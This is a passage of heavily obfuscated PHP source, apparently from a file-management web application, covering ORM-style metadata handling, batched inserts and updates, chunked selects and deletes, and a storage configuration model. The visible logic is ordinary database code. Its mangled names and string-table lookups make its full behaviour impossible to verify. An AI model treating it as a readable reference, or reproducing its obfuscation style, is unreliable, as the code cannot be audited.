!1); } protected function metaSet($ªÂøÓÆ, $Çì¨ÍÜÏ = null, $¿¢ôŸáé = null) { $É²”êˆ =& $_SERVER[œ—üé‹ê]; if (!$this->tableMeta || !$ªÂøÓÆ) { return !1; } $ƒ—¢ó¤š = $this->tableMeta[$É²”êˆ[448]]; $Õ‡ÄûæÒ = $this->tableMeta[$É²”êˆ[449]]; $½º¬ËÓñ = Model($Õ‡ÄûæÒ); $Øì³Û•· = array($ƒ—¢ó¤š => $ªÂøÓÆ, $É²”êˆ[450] => $Çì¨ÍÜÏ); if (is_null($Çì¨ÍÜÏ)) { return $½º¬ËÓñ->where(array($ƒ—¢ó¤š => $ªÂøÓÆ))->delete(); } if (is_null($¿¢ôŸáé) && is_string($Çì¨ÍÜÏ)) { return $½º¬ËÓñ->where($Øì³Û•·)->delete(); } $İ» °¡ = is_array($Çì¨ÍÜÏ) ? $Çì¨ÍÜÏ : array(); if (is_string($Çì¨ÍÜÏ)) { $İ» °¡[$Çì¨ÍÜÏ] = $¿¢ôŸáé; } $µ˜ÜƒÕ’ = array(); foreach ($İ» °¡ as $ÛÚ‡šì¢ => $¼ĞŠÜÒª) { if (is_null($¼ĞŠÜÒª) && is_string($ÛÚ‡šì¢)) { $½º¬ËÓñ->where(array($ƒ—¢ó¤š => $ªÂøÓÆ, $É²”êˆ[450] => $ÛÚ‡šì¢))->delete(); continue; } $this->checkLength($¼ĞŠÜÒª, !1, $Õ‡ÄûæÒ . $É²”êˆ[4] . $ÛÚ‡šì¢); $µ˜ÜƒÕ’[] = array($ƒ—¢ó¤š => $ªÂøÓÆ, $É²”êˆ[95] => $ÛÚ‡šì¢, $É²”êˆ[451] => $¼ĞŠÜÒª); } $Ê‰Áˆ ñ = $É²”êˆ[452] . $Õ‡ÄûæÒ; CacheLock::lock($Ê‰Áˆ ñ); $½º¬ËÓñ->where(array($ƒ—¢ó¤š => $ªÂøÓÆ))->addAll($µ˜ÜƒÕ’, array(), !0); CacheLock::unlock($Ê‰Áˆ ñ); return !0; } public function metaGet($Öó«šÔû, $ÊÔ‰é = false) { $è¢šáªà =& $_SERVER[œ—üé‹ê]; if (!$this->tableMeta) { return array(); } $üŠºğ¹ï = $this->tableMeta[$è¢šáªà[448]]; $Ô½¾äáç = Model($this->tableMeta[$è¢šáªà[449]]); if ($ÊÔ‰é) { $ÆÚ±” = array($üŠºğ¹ï => $Öó«šÔû, $è¢šáªà[95] => $ÊÔ‰é); return $Ô½¾äáç->where($ÆÚ±”)->getField($è¢šáªà[451]); } $ÆÚ±” = array($üŠºğ¹ï => $Öó«šÔû); $ÓŒæ“Ì = $Ô½¾äáç->field($è¢šáªà[453])->where($ÆÚ±”)->select(); $ÓŒæ“Ì = array_to_keyvalue($ÓŒæ“Ì, $è¢šáªà[95], $è¢šáªà[451]); return $ÓŒæ“Ì; } private function checkDataAutoHas($®ô–¼Ö½) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¬Ò—ô·ä) { if (in_array($®ô–¼Ö½, explode($_SERVER[œ—üé‹ê][50], $¬Ò—ô·ä[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ôˆàä¹ƒ, $’··Ü°„) { $œ¼ä— =& $_SERVER[œ—üé‹ê]; if (!is_array($ôˆàä¹ƒ)) { return; } foreach ($this->dataAuto as $×µ¾àÖ…) { $¡€ö°Ù = $×µ¾àÖ…[0]; if (!in_array($’··Ü°„, explode($œ¼ä—[50], $×µ¾àÖ…[2]))) { continue; } switch (trim($×µ¾àÖ…[3])) { case $œ¼ä—[396]: case $œ¼ä—[397]: $İ•Ç­Ã = $×µ¾àÖ…[1]; $•“½íÀä = isset($×µ¾àÖ…[4]) ? (array) $×µ¾àÖ…[4] : array(); if ($İ•Ç­Ã == $œ¼ä—[204] && array_key_exists($¡€ö°Ù, $ôˆàä¹ƒ)) { if (!$ôˆàä¹ƒ[$¡€ö°Ù]) { unset($ôˆàä¹ƒ[$¡€ö°Ù]); } break; } if (isset($ôˆàä¹ƒ[$¡€ö°Ù])) { array_unshift($•“½íÀä, $ôˆàä¹ƒ[$¡€ö°Ù]); } if ($œ¼ä—[396] == $×µ¾àÖ…[3]) { $ôˆàä¹ƒ[$¡€ö°Ù] = call_user_func_array($İ•Ç­Ã, $•“½íÀä); } else { $ôˆàä¹ƒ[$¡€ö°Ù] = call_user_func_array(array(&$this, $İ•Ç­Ã), $•“½íÀä); } break; case $œ¼ä—[348]: if (isset($ôˆàä¹ƒ[$¡€ö°Ù]) && $ôˆàä¹ƒ[$¡€ö°Ù]) { $ôˆàä¹ƒ[$¡€ö°Ù] = call_user_func_array(array(&$this, $×µ¾àÖ…[1]), array($ôˆàä¹ƒ[$¡€ö°Ù])); } break; case $œ¼ä—[351]: $ôˆàä¹ƒ[$¡€ö°Ù] = $ôˆàä¹ƒ[$×µ¾àÖ…[1]]; break; case $œ¼ä—[369]: if (isset($ôˆàä¹ƒ[$¡€ö°Ù]) && !is_string($ôˆàä¹ƒ[$¡€ö°Ù])) { $ôˆàä¹ƒ[$¡€ö°Ù] = json_encode_force($ôˆàä¹ƒ[$¡€ö°Ù]); $ôˆàä¹ƒ[$¡€ö°Ù] = self::textEncode($ôˆàä¹ƒ[$¡€ö°Ù]); } break; case $œ¼ä—[398]: if ($ôˆàä¹ƒ[$¡€ö°Ù] === $œ¼ä—[12]) { unset($ôˆàä¹ƒ[$¡€ö°Ù]); } break; case $œ¼ä—[399]: $ôˆàä¹ƒ[$¡€ö°Ù] = $×µ¾àÖ…[1]; default: break; } } if ($’··Ü°„ == $œ¼ä—[430]) { $Ïşş§‡ = strtolower($this->db->getDbType()); if (strpos($Ïşş§‡, $œ¼ä—[13]) !== 0) { return; } $ÊƒœÉ™ì = $this->field(!0)->fields; $ˆœ•³êà = $ÊƒœÉ™ì[$œ¼ä—[329]]; if (isset($ÊƒœÉ™ì[$œ¼ä—[328]])) { unset($ˆœ•³êà[$ÊƒœÉ™ì[$œ¼ä—[328]]]); } foreach ($ˆœ•³êà as $Ç«Ô½ç‹ => $’··Ü°„) { if (!isset($ôˆàä¹ƒ[$Ç«Ô½ç‹])) { $ôˆàä¹ƒ[$Ç«Ô½ç‹] = $œ¼ä—[12]; } } } } private function dataAfterFilter(&$ˆèƒşÃ­) { $›ÅÉÌ«Ù =& $_SERVER[œ—üé‹ê]; foreach ($this->dataAuto as $Ÿ£Ü°£¥) { $”ñ˜úüà = $Ÿ£Ü°£¥[0]; if (!isset($ˆèƒşÃ­[$”ñ˜úüà])) { continue; } if (!in_array($›ÅÉÌ«Ù[432], explode($›ÅÉÌ«Ù[50], $Ÿ£Ü°£¥[2]))) { continue; } switch (trim($Ÿ£Ü°£¥[3])) { case $›ÅÉÌ«Ù[396]: case $›ÅÉÌ«Ù[397]: $³Øå’òş = isset($Ÿ£Ü°£¥[4]) ? (array) $Ÿ£Ü°£¥[4] : array(); array_unshift($³Øå’òş, $ˆèƒşÃ­[$”ñ˜úüà]); if (isset($Ÿ£Ü°£¥[4]) && $Ÿ£Ü°£¥[4] == $›ÅÉÌ«Ù[454]) { $³Øå’òş = array($ˆèƒşÃ­[$”ñ˜úüà]); } if ($›ÅÉÌ«Ù[396] == $Ÿ£Ü°£¥[3]) { $ˆèƒşÃ­[$”ñ˜úüà] = call_user_func_array($Ÿ£Ü°£¥[1], $³Øå’òş); } else { $ˆèƒşÃ­[$”ñ˜úüà] = call_user_func_array(array(&$this, $Ÿ£Ü°£¥[1]), $³Øå’òş); } break; case $›ÅÉÌ«Ù[348]: if (isset($ˆèƒşÃ­[$”ñ˜úüà]) && $ˆèƒşÃ­[$”ñ˜úüà]) { $ˆèƒşÃ­[$”ñ˜úüà] = call_user_func_array(array(&$this, $Ÿ£Ü°£¥[1]), array($ˆèƒşÃ­[$”ñ˜úüà])); } break; case $›ÅÉÌ«Ù[351]: $ˆèƒşÃ­[$”ñ˜úüà] = $ˆèƒşÃ­[$Ÿ£Ü°£¥[1]]; break; case $›ÅÉÌ«Ù[369]: $·İ¸ˆ«š = $ˆèƒşÃ­[$”ñ˜úüà]; $·İ¸ˆ«š = self::textDecode($·İ¸ˆ«š); $ˆèƒşÃ­[$”ñ˜úüà] = json_decode($·İ¸ˆ«š, !0); if (is_null($ˆèƒşÃ­[$”ñ˜úüà])) { $ˆèƒşÃ­[$”ñ˜úüà] = $·İ¸ˆ«š; } break; case $›ÅÉÌ«Ù[398]: if ($ˆèƒşÃ­[$”ñ˜úüà] === $›ÅÉÌ«Ù[12]) { unset($ˆèƒşÃ­[$”ñ˜úüà]); } break; case $›ÅÉÌ«Ù[399]: $ˆèƒşÃ­[$”ñ˜úüà] = $Ÿ£Ü°£¥[1]; break; default: break; } } } public function saveAll($Ô¹é‡Š¨, $ŞÄùË¬ = false) { $’“¥³Å =& $_SERVER[œ—üé‹ê]; $ÊÊ×—ïÌ = $this->db; $¡Øš„ = $this->tablePrefix . $this->tableName; $€ëş’ë« = $this->saveAllChunkMake($Ô¹é‡Š¨); $ŞÄùË¬ = is_array($ŞÄùË¬) ? $ŞÄùË¬ : array(); foreach ($€ëş’ë« as $ëë‰Ÿ®») { $¾‘±—ç¤ = $’“¥³Å[12]; $üˆïñŠ = $’“¥³Å[12]; $Ó…¤Ê­¢ = array(); $ÅÊùæÖì = array(); foreach ($ëë‰Ÿ®» as $ìŞğª–Ú => $Ñø™¦Éú) { $¾‘±—ç¤ = $Ñø™¦Éú[$’“¥³Å[455]]; $ÅÊùæÖì[] = $Ñø™¦Éú[$’“¥³Å[456]]; $İåğã = $ÊÊ×—ïÌ->parseValue($Ñø™¦Éú[$’“¥³Å[456]]); foreach ($Ñø™¦Éú[$’“¥³Å[457]] as $ûÆÛ†Ûµ => $³šØ…ö†) { if (!$Ó…¤Ê­¢[$ûÆÛ†Ûµ]) { $Ó…¤Ê­¢[$ûÆÛ†Ûµ] = array(); } $Ó…¤Ê­¢[$ûÆÛ†Ûµ][] = $’“¥³Å[458] . $İåğã . $’“¥³Å[459] . $ÊÊ×—ïÌ->parseValue($³šØ…ö†); } } $€«‚œ„É = $¾‘±—ç¤; $€«‚œ„É = $ÊÊ×—ïÌ->parseKey($€«‚œ„É); foreach ($Ó…¤Ê­¢ as $ûÆÛ†Ûµ => $ÂÒ°ÔçŒ) { $üˆïñŠ .= $’“¥³Å[285] . $ÊÊ×—ïÌ->parseKey($ûÆÛ†Ûµ) . $’“¥³Å[460] . $€«‚œ„É . $’“¥³Å[461]; $üˆïñŠ .= implode($’“¥³Å[285], $ÂÒ°ÔçŒ) . $’“¥³Å[462]; } $È®ŞÎòÙ = $ŞÄùË¬; $È®ŞÎòÙ[$¾‘±—ç¤] = array($’“¥³Å[7], $ÅÊùæÖì); $“…Å§î = "\125\120\x44\x41\124\105\40\140{$¡Øš„}\140\40\123\x45\124\x20" . rtrim($üˆïñŠ, $’“¥³Å[50]) . $’“¥³Å[285] . $ÊÊ×—ïÌ->parseWhere($È®ŞÎòÙ); $this->execute($“…Å§î); $this->chunkEventCheck(count($ëë‰Ÿ®»)); } $this->chunkEventSet(); } public function saveAllEach($æÔ‘üÔ, $ÀƒÎš÷§ = false) { $ëˆá÷Ó¨ =& $_SERVER[œ—üé‹ê]; $¦ÀÇö‚­ = $this->db; $¤ä˜¹Áô = $this->tablePrefix . $this->tableName; $ıò¥ñ½ = $this->saveAllChunkMake($æÔ‘üÔ); $ÀƒÎš÷§ = is_array($ÀƒÎš÷§) ? $ÀƒÎš÷§ : array(); foreach ($ıò¥ñ½ as $Ü²Õ÷’Ë) { foreach ($Ü²Õ÷’Ë as $ïà‰µø => $ø¨ƒôøî) { $–ßŸö· = $ëˆá÷Ó¨[463]; foreach ($ø¨ƒôøî[$ëˆá÷Ó¨[457]] as $ù» ´ÓÖ => $Ùï£¥š«) { $–ßŸö· .= $¦ÀÇö‚­->parseKey($ù» ´ÓÖ) . $ëˆá÷Ó¨[464] . $¦ÀÇö‚­->parseValue($Ùï£¥š«) . $ëˆá÷Ó¨[50]; } $£˜„ªŠ¤ = $ÀƒÎš÷§; $£˜„ªŠ¤[$ø¨ƒôøî[$ëˆá÷Ó¨[455]]] = $ø¨ƒôøî[$ëˆá÷Ó¨[456]]; $•É¾’îÛ = "\125\120\x44\101\124\105\x20\140{$¤ä˜¹Áô}\140\x20\x53\x45\x54\x20" . rtrim($–ßŸö·, $ëˆá÷Ó¨[50]) . $ëˆá÷Ó¨[465] . $¦ÀÇö‚­->parseWhere($£˜„ªŠ¤) . $ëˆá÷Ó¨[466]; $this->execute($•É¾’îÛ); } $this->chunkEventCheck(count($Ü²Õ÷’Ë)); } $this->chunkEventSet(); } private function saveAllChunkMake($™ìÄú) { $„‡œåºç =& $_SERVER[œ—üé‹ê]; $·èÕ”à¾ = self::SQL_WHERE_IN_CHUNK; $™ìÄú = is_array($™ìÄú) ? $™ìÄú : array(); $ªÖİœõÂ = array(); $´‹å«êÜ = ceil(count($™ìÄú) / $·èÕ”à¾); for ($æ²‰ëœÄ = 0; $æ²‰ëœÄ < $´‹å«êÜ; $æ²‰ëœÄ++) { $ ”³­ŞÍ = array(); $Çöş ã = array_slice($™ìÄú, $æ²‰ëœÄ * $·èÕ”à¾, $·èÕ”à¾); foreach ($Çöş ã as $»¥¬“ï›) { if (!is_array($»¥¬“ï›) || count($»¥¬“ï›) < 4 || count($»¥¬“ï›) % 2 != 0) { continue; } $š¶ÖÌà = array(); for ($í¯÷†Ÿ¡ = 2; $í¯÷†Ÿ¡ < count($»¥¬“ï›); $í¯÷†Ÿ¡ += 2) { $š¶ÖÌà[$»¥¬“ï›[$í¯÷†Ÿ¡]] = $»¥¬“ï›[$í¯÷†Ÿ¡ + 1]; } $ ”³­ŞÍ[] = array($„‡œåºç[455] => $»¥¬“ï›[0], $„‡œåºç[456] => $»¥¬“ï›[1], $„‡œåºç[457] => $š¶ÖÌà); } $ªÖİœõÂ[] = $ ”³­ŞÍ; } return $ªÖİœõÂ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¤Ø¤‚Ş´ = false, $Œ›³µ = false) { $this->_chunkEvent = $¤Ø¤‚Ş´; $this->_chunkEventParam = $Œ›³µ; } private function chunkEventCheck($Å•†ÃÃß) { if (!$this->_chunkEvent) { return; } $™³°™Å = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $™³°™Å[$_SERVER[œ—üé‹ê][467]] = $Å•†ÃÃß; Hook::trigger($this->_chunkEvent, $™³°™Å); } public function addAll($Æ×ÏŞ„, $¾¥÷¦ê = array(), $©õéËµ = false) { $ØÕèÉ£ =& $_SERVER[œ—üé‹ê]; ignore_timeout(); $Š¸üóİñ = self::SQL_WHERE_IN_CHUNK; if (empty($Æ×ÏŞ„)) { $this->error = think_lang($ØÕèÉ£[349]); return !1; } $¾¥÷¦ê = $this->_parseOptions($¾¥÷¦ê); foreach ($Æ×ÏŞ„ as $¨ÏÙë»× => $ìäŠŞŞ°) { $Æ×ÏŞ„[$¨ÏÙë»×] = $this->_facade($ìäŠŞŞ°); $this->_beforeInsert($Æ×ÏŞ„[$¨ÏÙë»×], $¾¥÷¦ê); } if (method_exists($this->db, $ØÕèÉ£[350])) { for ($³¢¥±©Ü = 0; $³¢¥±©Ü < count($Æ×ÏŞ„); $³¢¥±©Ü += $Š¸üóİñ) { $ÎÈéşûÍ = array_slice($Æ×ÏŞ„, $³¢¥±©Ü, $Š¸üóİñ); if (!is_array($ÎÈéşûÍ) || count($ÎÈéşûÍ) == 0) { break; } $úŞ’Û§ = $this->db->insertAll($ÎÈéşûÍ, $¾¥÷¦ê, $©õéËµ); $this->chunkEventCheck(count($ÎÈéşûÍ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Æ×ÏŞ„ as $¨ÏÙë»× => $ìäŠŞŞ°) { $úŞ’Û§ = $this->db->insert($ìäŠŞŞ°, $¾¥÷¦ê, $©õéËµ); } $this->commit(); } if (!1 !== $úŞ’Û§) { $ÓóÏ¯ĞŠ = $this->getLastInsID(); if ($ÓóÏ¯ĞŠ) { return $ÓóÏ¯ĞŠ; } } return $úŞ’Û§; } public function save($Õôı³­ò = '', $ƒ‡Â“Í• = array()) { $÷°‹¨©ï =& $_SERVER[œ—üé‹ê]; $×õ¯§‹ı = self::SQL_WHERE_IN_CHUNK; $’Ÿ¹…¦ = $this->optionsValue(); $Û• ğ°è = $this->findWhereField($’Ÿ¹…¦); if (!$Û• ğ°è) { return parent::save($Õôı³­ò, $ƒ‡Â“Í•); } $ÉŞ‡¿Ï = 0; $ı­Ä•æµ = $’Ÿ¹…¦[$÷°‹¨©ï[353]][$Û• ğ°è][1]; $ı­Ä•æµ = is_array($ı­Ä•æµ) ? $ı­Ä•æµ : array(); $«„¶éÚ = count($ı­Ä•æµ); for ($Ô¤Û‹¿ = 0; $Ô¤Û‹¿ < $«„¶éÚ; $Ô¤Û‹¿ += $×õ¯§‹ı) { $çÖÅ·å = array_slice($ı­Ä•æµ, $Ô¤Û‹¿, $×õ¯§‹ı); if (!is_array($çÖÅ·å) || count($çÖÅ·å) == 0) { break; } $’Ÿ¹…¦[$÷°‹¨©ï[353]][$Û• ğ°è][1] = $çÖÅ·å; $this->optionsValue($’Ÿ¹…¦); $ÉŞ‡¿Ï += parent::save($Õôı³­ò, $ƒ‡Â“Í•); $this->chunkEventCheck(count($çÖÅ·å)); } $this->chunkEventSet(); return $ÉŞ‡¿Ï; } public function add($¡ú‚Î‡ë = '', $éÀÖßœÇ = array(), $ñò¥ì¬ = false) { if ($this->addTaskStatus && is_array($¡ú‚Î‡ë)) { $this->addTaskData[] = $¡ú‚Î‡ë; return; } return parent::add($¡ú‚Î‡ë, $éÀÖßœÇ, $ñò¥ì¬); } public function parseWhereLike($‘ê¼ä±, $©ïã«Ï’ = '', $§ÃÕÊµÖ = false, &$š½¾Èı× = false) { $´¨ªõıä =& $_SERVER[œ—üé‹ê]; $¡÷„ÎÂ­ = $GLOBALS[$´¨ªõıä[6]][$´¨ªõıä[468]]; if (!$¡÷„ÎÂ­[$´¨ªõıä[469]]) { return $‘ê¼ä±; } if (!in_array($this->tableName, array($´¨ªõıä[429], $´¨ªõıä[470], $´¨ªõıä[471], $´¨ªõıä[472]))) { return $‘ê¼ä±; } if (!is_array($‘ê¼ä±)) { return $‘ê¼ä±; } $­ÉÅí³½ = array(); $“É®Ù = 0; foreach ($‘ê¼ä± as $áæ¾ùÂì => $‡’ö¹¿ˆ) { if (is_array($‡’ö¹¿ˆ) && count($‡’ö¹¿ˆ) == 2 && $‡’ö¹¿ˆ[0] == $´¨ªõıä[473] && is_string($‡’ö¹¿ˆ[1]) && substr($‡’ö¹¿ˆ[1], 0, 1) == $´¨ªõıä[474] && substr($‡’ö¹¿ˆ[1], strlen($‡’ö¹¿ˆ[1]) - 1, 1) == $´¨ªõıä[474]) { $š½¾Èı× = !0; $€Üé¦ = is_string($áæ¾ùÂì) ? $áæ¾ùÂì : $©ïã«Ï’; $æÜİ’–¾ = substr($‡’ö¹¿ˆ[1], 1, strlen($‡’ö¹¿ˆ[1]) - 2); $æÜİ’–¾ = $this->db->escapeString($æÜİ’–¾); if (!strpos($€Üé¦, $´¨ªõıä[10])) { $€Üé¦ = $´¨ªõıä[475] . $€Üé¦ . $´¨ªõıä[475]; } $­ÁŞÜĞ´ = $´¨ªõıä[220] . $æÜİ’–¾ . $´¨ªõıä[220]; $æÜİ’–¾ = str_replace(array($´¨ªõıä[10], $´¨ªõıä[476]), $´¨ªõıä[477], $æÜİ’–¾); if ($¡÷„ÎÂ­[$´¨ªõıä[478]]) { $­ÁŞÜĞ´ = $´¨ªõıä[479] . $æÜİ’–¾ . $´¨ªõıä[480]; if ($¡÷„ÎÂ­[$´¨ªõıä[481]]) { $­ÁŞÜĞ´ = $´¨ªõıä[480] . $æÜİ’–¾ . $´¨ªõıä[479]; } } $¢ÍÅ­Àœ = Hook::trigger($´¨ªõıä[482], $æÜİ’–¾, $­ÁŞÜĞ´); if ($¢ÍÅ­Àœ) { $­ÁŞÜĞ´ = $¢ÍÅ­Àœ; } $­ÉÅí³½[$“É®Ù] = $´¨ªõıä[483] . $€Üé¦ . $´¨ªõıä[484] . $­ÁŞÜĞ´ . $´¨ªõıä[485]; $“É®Ù++; continue; } if (is_array($‡’ö¹¿ˆ)) { $©ïã«Ï’ = is_string($áæ¾ùÂì) ? $áæ¾ùÂì : $©ïã«Ï’; $‡’ö¹¿ˆ = $this->parseWhereLike($‡’ö¹¿ˆ, $©ïã«Ï’, !0, $š½¾Èı×); } if (is_numeric($áæ¾ùÂì)) { $­ÉÅí³½[$“É®Ù] = $‡’ö¹¿ˆ; $“É®Ù++; } else { $­ÉÅí³½[$áæ¾ùÂì] = $‡’ö¹¿ˆ; } } if ($š½¾Èı× && !$§ÃÕÊµÖ) { } return $­ÉÅí³½; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ß–ç¼Ùè = array()) { $«³±ï¡Õ =& $_SERVER[œ—üé‹ê]; $Æ‘›Â€ã = self::SQL_WHERE_IN_CHUNK; $ìÂâ¸ÜÖ = $this->optionsValue(); $ä³Šªé = $this->findWhereField($ìÂâ¸ÜÖ); if (!$ä³Šªé || isset($ìÂâ¸ÜÖ[$«³±ï¡Õ[368]]) || isset($ìÂâ¸ÜÖ[$«³±ï¡Õ[428]])) { return parent::select($ß–ç¼Ùè); } $ƒ¿Ùİ°á = $ìÂâ¸ÜÖ[$«³±ï¡Õ[353]][$ä³Šªé][1]; $ƒ¿Ùİ°á = is_array($ƒ¿Ùİ°á) ? $ƒ¿Ùİ°á : array(); $š™âØ = null; for ($¹ÚğşÃ— = 0; $¹ÚğşÃ— < count($ƒ¿Ùİ°á); $¹ÚğşÃ— += $Æ‘›Â€ã) { $’™ş±Š¹ = array_slice($ƒ¿Ùİ°á, $¹ÚğşÃ—, $Æ‘›Â€ã); if (!is_array($’™ş±Š¹) || count($’™ş±Š¹) == 0) { break; } $ìÂâ¸ÜÖ[$«³±ï¡Õ[353]][$ä³Šªé][1] = $’™ş±Š¹; $this->optionsValue($ìÂâ¸ÜÖ); $È¯–ÆÁü = parent::select($ß–ç¼Ùè); if (!$È¯–ÆÁü) { continue; } $š™âØ = is_array($š™âØ) ? $š™âØ : array(); $š™âØ = array_merge($š™âØ, $È¯–ÆÁü); } return $š™âØ; } public function delete($ØİµüÔï = array()) { $ëÁ«¿À =& $_SERVER[œ—üé‹ê]; $®ªôñÉß = self::SQL_WHERE_IN_CHUNK; $‰½§²õ = $this->optionsValue(); $¤±ææƒÑ = $this->findWhereField($‰½§²õ); if (!$¤±ææƒÑ) { return parent::delete($ØİµüÔï); } $ñ…ùÖ­ = 0; $Ûù‰óÍÈ = $‰½§²õ[$ëÁ«¿À[353]][$¤±ææƒÑ][1]; $Ûù‰óÍÈ = is_array($Ûù‰óÍÈ) ? $Ûù‰óÍÈ : array(); for ($Øó””¡Å = 0; $Øó””¡Å < count($Ûù‰óÍÈ); $Øó””¡Å += $®ªôñÉß) { $³ñ È‚ = array_slice($Ûù‰óÍÈ, $Øó””¡Å, $®ªôñÉß); if (!is_array($³ñ È‚) || count($³ñ È‚) == 0) { break; } $‰½§²õ[$ëÁ«¿À[353]][$¤±ææƒÑ][1] = $³ñ È‚; $this->optionsValue($‰½§²õ); $ñ…ùÖ­ += parent::delete($ØİµüÔï); } return $ñ…ùÖ­; } private function findWhereField($ê£±·Šà) { $ºÇõåùÜ =& $_SERVER[œ—üé‹ê]; $ŠêÀ·Áƒ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ê£±·Šà) || !is_array($ê£±·Šà[$ºÇõåùÜ[353]])) { return !1; } foreach ($ê£±·Šà[$ºÇõåùÜ[353]] as $È®¢ñ¤í => $›ó²Èš) { if (is_array($›ó²Èš) && isset($›ó²Èš[0]) && is_string($›ó²Èš[0]) && strtolower($›ó²Èš[0]) == $ºÇõåùÜ[7] && is_array($›ó²Èš[1]) && count($›ó²Èš[1]) > $ŠêÀ·Áƒ) { ignore_timeout(); return $È®¢ñ¤í; } } return !1; } public function setMasterDB($ßĞèæİŸ = true) { think_config($_SERVER[œ—üé‹ê][486], $ßĞèæİŸ); } } goto Eö‘±œŒ; aŒŞ»ŠÇ°: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\163\x74\x6f\162\141\x67\x65\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\163\151\x7a\145\115\x61\x78", "\x73\171\163\x74\x65\155", "\x64\145\x66\x61\165\154\164", "\x64\162\151\x76\145\162", "\143\157\156\146\151\x67"); public function listData($‡Áõƒ”Ò = false, $²ËÔÕ±¹ = "\x6d\x6f\x64\151\x66\x79\x54\151\155\145", $‚õ³É¸© = false) { $û°ó¶²Œ =& $_SERVER[œ—üé‹ê]; $¤ÎÂ‹ã = parent::listData($‡Áõƒ”Ò, $²ËÔÕ±¹, $‚õ³É¸©); if ($‡Áõƒ”Ò) { return $¤ÎÂ‹ã; } $ÁÁåÏ = array(); if ($GLOBALS[$û°ó¶²Œ[2509]]) { $ÁÁåÏ = $this->ioSizeUseGet(array_to_keyvalue($¤ÎÂ‹ã, $û°ó¶²Œ[12], $û°ó¶²Œ[487])); } foreach ($¤ÎÂ‹ã as $ÆÆá¾Ì => $êú©¦™ô) { unset($¤ÎÂ‹ã[$ÆÆá¾Ì][$û°ó¶²Œ[6]]); $¤ÎÂ‹ã[$ÆÆá¾Ì][$û°ó¶²Œ[2167]] = isset($ÁÁåÏ[$êú©¦™ô[$û°ó¶²Œ[487]]]) ? $ÁÁåÏ[$êú©¦™ô[$û°ó¶²Œ[487]]] : 0; } return $¤ÎÂ‹ã; } public function ioSizeUseGet($Ô§×Àİû) { $åĞü‚È÷ =& $_SERVER[œ—üé‹ê]; if (!$Ô§×Àİû) { return array(); } $Ú†ÔÄ… = $åĞü‚È÷[2510] . implode($åĞü‚È÷[50], $Ô§×Àİû); $‡Í‘Ğƒ° = Cache::get($Ú†ÔÄ…); if ($‡Í‘Ğƒ°) { return $‡Í‘Ğƒ°; } $Œ¨¥ÂÓÎ = array($åĞü‚È÷[935] => $åĞü‚È÷[487], $åĞü‚È÷[2511] => $åĞü‚È÷[79]); $…ïì†« = array($åĞü‚È÷[935] => array($åĞü‚È÷[7], $Ô§×Àİû)); $‡Í‘Ğƒ° = Model($åĞü‚È÷[925])->field($Œ¨¥ÂÓÎ)->where($…ïì†«)->group($åĞü‚È÷[935])->select(); $‡Í‘Ğƒ° = array_to_keyvalue($‡Í‘Ğƒ°, $åĞü‚È÷[487], $åĞü‚È÷[79]); Cache::set($Ú†ÔÄ…, $‡Í‘Ğƒ°, 600); return $‡Í‘Ğƒ°; } public function getConfig($êó´¸Ş…) { $¸“­¶éÁ = parent::listData($êó´¸Ş…); $·‰™ù˜ = _get($¸“­¶éÁ, $_SERVER[œ—üé‹ê][6], array()); if ($·‰™ù˜ && !is_array($·‰™ù˜)) { $·‰™ù˜ = json_decode($·‰™ù˜, !0); } return $·‰™ù˜; } public function update($¾ë¡ÎÇ¹, $äĞÍÙ„µ) { $ô˜ß¼ı— =& $_SERVER[œ—üé‹ê]; $‹½ğ¡Ğ = $äĞÍÙ„µ[$ô˜ß¼ı—[32]]; $í‡ğú²¬ = array_to_keyvalue(parent::listData(), $ô˜ß¼ı—[32]); if (isset($í‡ğú²¬[$‹½ğ¡Ğ]) && $í‡ğú²¬[$‹½ğ¡Ğ][$ô˜ß¼ı—[487]] != $¾ë¡ÎÇ¹) { return !1; } $this->checkPwd($¾ë¡ÎÇ¹, $äĞÍÙ„µ); if (isset($äĞÍÙ„µ[$ô˜ß¼ı—[2512]]) && $äĞÍÙ„µ[$ô˜ß¼ı—[2512]] == $ô˜ß¼ı—[91]) { $this->checkConfig($äĞÍÙ„µ); } unset($äĞÍÙ„µ[$ô˜ß¼ı—[2512]]); $şÇ‹Ö¢ = parent::update($¾ë¡ÎÇ¹, $äĞÍÙ„µ); if ($şÇ‹Ö¢ && $äĞÍÙ„µ[$ô˜ß¼ı—[37]]) { foreach ($í‡ğú²¬ as $¸²§İú©) { if ($¸²§İú©[$ô˜ß¼ı—[37]] && $¸²§İú©[$ô˜ß¼ı—[487]] != $¾ë¡ÎÇ¹) { parent::update($¸²§İú©[$ô˜ß¼ı—[487]], array($ô˜ß¼ı—[37] => 0)); } } $this->updateBackup($¾ë¡ÎÇ¹, $í‡ğú²¬); } return $şÇ‹Ö¢; } public function add($Æ™„ÄÂŠ) { $‡Í©ª è =& $_SERVER[œ—üé‹ê]; $”±Õ·ÕÖ = array_to_keyvalue(parent::listData(), $‡Í©ª è[32]); if (isset($”±Õ·ÕÖ[$Æ™„ÄÂŠ[$‡Í©ª è[32]]])) { return !1; } $this->checkConfig($Æ™„ÄÂŠ); $†Ä¾ÆÍ† = parent::insert($Æ™„ÄÂŠ); if ($†Ä¾ÆÍ† && $Æ™„ÄÂŠ[$‡Í©ª è[37]]) { foreach ($”±Õ·ÕÖ as $»î˜Äà—) { if ($»î˜Äà—[$‡Í©ª è[37]]) { parent::update($»î˜Äà—[$‡Í©ª è[487]], array($‡Í©ª è[37] => 0)); } } $this->updateBackup($†Ä¾ÆÍ†, $”±Õ·ÕÖ); } return $†Ä¾ÆÍ†; } public function updateBackup($¡ŸôÚò±, $Ãæóş¦ª) { $Ïç°¼° =& $_SERVER[œ—üé‹ê]; $Èâ²“î› = Model($Ïç°¼°[882])->get($Ïç°¼°[888]); $Èâ²“î› = 